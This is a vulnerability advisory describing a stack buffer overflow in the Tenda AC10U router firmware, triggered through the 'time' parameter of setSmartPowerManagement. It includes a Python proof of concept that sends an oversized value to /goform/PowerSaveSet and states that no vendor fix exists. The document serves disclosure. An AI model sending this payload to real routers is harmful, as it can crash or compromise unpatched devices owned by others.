# Tenda AC10U v1.0 US_AC10UV1.0RTL_V15.03.06.49_multi_TDE01 was discovered to contain a stack overflow via the time parameter in the setSmartPowerManagement function.

## Vulnerability Description

Vendor: Tenda

Product: AC10U

Version: US_AC10UV1.0RTL_V15.03.06.49_multi_TDE01

Type: Buffer Overflow

Firmware link: https://www.tendacn.com/download/detail-3795.html

## Vulnerability Details

The function "setSmartPowerManagement" retrieves the parameter "time" using "websGetVar",  the value of "time" is formatted using the sscanf function with the format "%[^:]:%[^-]-%[^:]:%s". This greedy matching mechanism is insecure, as it can cause a stack overflow if the size of the data we enter exceeds the sizes of "hour_start", "min_start", "hour_end", or "min_end".

![1705413094961](image/setSmartPowerManagement/1705413094961.png)

## **Recurring vulnerabilities and POC**

```python
import requests
ip = '192.168.159.128'
url = f'http://{ip}/goform/PowerSaveSet'
payload = {
    "time": '1:00-1:'+'1'*0x500
}
res = requests.post(url=url, data=payload)
print(res.content)

```

## Solution

The vendor has not yet provided a fix for the vulnerability, please watch the vendor's homepage for updates:
https://www.tendacn.com/product/specification/ac10u.html
